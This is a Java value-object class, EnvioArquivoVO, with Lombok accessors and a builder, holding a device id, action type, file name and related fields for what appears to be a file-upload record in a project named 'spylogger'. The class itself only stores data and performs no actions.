package com.gravatasufoca.spylogger.vos;

import com.gravatasufoca.spylogger.model.TipoAcao;

import lombok.Getter;
import lombok.Setter;

/**
 * Created by bruno on 05/01/17.
 */
@Getter
@Setter
public class EnvioArquivoVO {

    private Integer idAparelho;
    private TipoAcao tipoAcao;
    private Integer id;
    private String phpId;
    private String arquivo;
    private Boolean existe;

    private EnvioArquivoVO() {

    }

    public static class EnvioArquivoVOBuilder{
        private EnvioArquivoVO envioArquivoVO=new EnvioArquivoVO();

        public EnvioArquivoVOBuilder setIdAparelho(Integer idAparelho) {
            envioArquivoVO.setIdAparelho(idAparelho);
            return this;
        }

        public EnvioArquivoVOBuilder setTipoAcao(TipoAcao tipoAcao) {
            envioArquivoVO.setTipoAcao(tipoAcao);
            return this;
        }

        public EnvioArquivoVOBuilder setId(Integer id) {
            envioArquivoVO.setId(id);
            return this;
        }

        public EnvioArquivoVOBuilder setPhpId(String phpId) {
            envioArquivoVO.setPhpId(phpId);
            return this;
        }

        public EnvioArquivoVOBuilder setArquivo(String arquivo) {
            envioArquivoVO.setArquivo(arquivo);
            return this;
        }

        public EnvioArquivoVOBuilder setExiste(boolean existe) {
            envioArquivoVO.setExiste(existe);
            return this;
        }

        public EnvioArquivoVO build(){
            return envioArquivoVO;
        }
    }

}